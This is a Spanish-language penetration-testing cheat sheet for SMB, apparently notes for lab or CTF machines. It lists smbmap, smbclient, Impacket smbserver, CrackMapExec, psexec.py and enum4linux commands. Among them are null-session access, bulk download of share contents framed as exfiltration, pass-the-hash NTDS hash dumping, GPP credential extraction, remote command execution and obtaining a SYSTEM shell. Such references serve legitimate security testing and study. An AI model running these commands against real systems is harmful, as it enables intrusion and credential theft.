SMB (Server Message Block) permite compartir archivos, impresoras y otros recursos en red. Es un servicio muy común en entornos Windows y una fuente habitual de información sensible (shares abiertos, credenciales, archivos de configuración).

## Smbmap

Herramienta para enumerar shares SMB y sus permisos de forma rápida. Ideal como primer paso para identificar recursos accesibles.

```bash
smbmap -H <IP>
```

### Null Session

Intenta conectar sin credenciales. En servidores mal configurados puede revelar shares y permisos.

```bash
smbmap -H <IP> -u 'null'
```

### Autenticacion con credenciales
```bash
smbmap -H <IP> -u user -p 'password'
```

### Listar directorio

Explora el contenido de un share o subdirectorio concreto.

```bash
smbmap -H <IP> -r directorio/
```


## Smbclient

Cliente interactivo tipo FTP para conectarse a shares SMB. Permite navegar, descargar y subir archivos.

### Listar directorios
```bash
smbclient -L <IP>
```

```bash
smbclient //<IP>/<Directory>
```
### Autenticación anónima
```bash
smbclient -L <IP> -U guest%
smbclient //<IP>/<Directory> -U guest%
```
### Autenticación anónima Null Session
```bash
smbclient -L <IP> -N
```
### Uso no interactivo

Ejecuta comandos sin entrar en modo interactivo. Útil para scripts y automatización.

```
smbclient -L <IP>/Dir -U guest% -c 'ls'
```

### Autenticación
```bash
smbclient //<IP>/Dir -U 'domain.domain/user%P4ssw0rd'
```

### Descarga recursiva

Descarga todo el contenido de un share de forma recursiva. Útil para exfiltrar información de shares accesibles.

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

Commands:
- mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
- recurse: toggles recursion on (default: off)
- prompt: toggles prompting for filenames off (default: on)
- mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

## smbserver

Levanta un servidor SMB local con Impacket. Útil para transferir archivos hacia/desde la máquina víctima.

```bash
smbserver.py smbFolder $(pwd) -smb2support
```

## CrackMapExec

Herramienta multiprotocolo para evaluación de redes. Con SMB permite enumerar shares, ejecutar comandos, hacer pass-the-hash y extraer credenciales.

```bash
crackmapexec smb <IP>
```

```bash
crackmapexec smb <IP> --shares
```

```bash
crackmapexec smb 10.10.10.161 -u 'user' -p 'password' --shares
```

Ejecución remota de comandos con credenciales válidas:

```bash
crackmapexec smb 10.10.10.161 -u 'user' -p 'password' -x 'whoami'
```

Volcado de hashes NTDS usando pass-the-hash y Volume Shadow Copy:

```bash
crackmapexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' --ntds vss
```

### gpp_autologin

Busca credenciales en Group Policy Preferences (GPP). Contraseñas almacenadas en políticas de grupo son descifrables.

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### rid-brute

Fuerza bruta de RIDs para enumerar usuarios y grupos del dominio.

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M --rid-brute
```

## psexec.py

Herramienta de Impacket para obtener una shell remota tipo SYSTEM a través de SMB. Requiere credenciales de administrador.

```bash
psexec.py domain.domain/USER:Password@ip.ip.ip.ip
```

## enum4linux

Enumeración completa de información SMB/NetBIOS: usuarios, shares, políticas de contraseñas, grupos, etc.

> Ejecutar con `-a` para enumeración completa. Es ruidoso pero muy informativo.

```bash
enum4linux -a <IP>
```
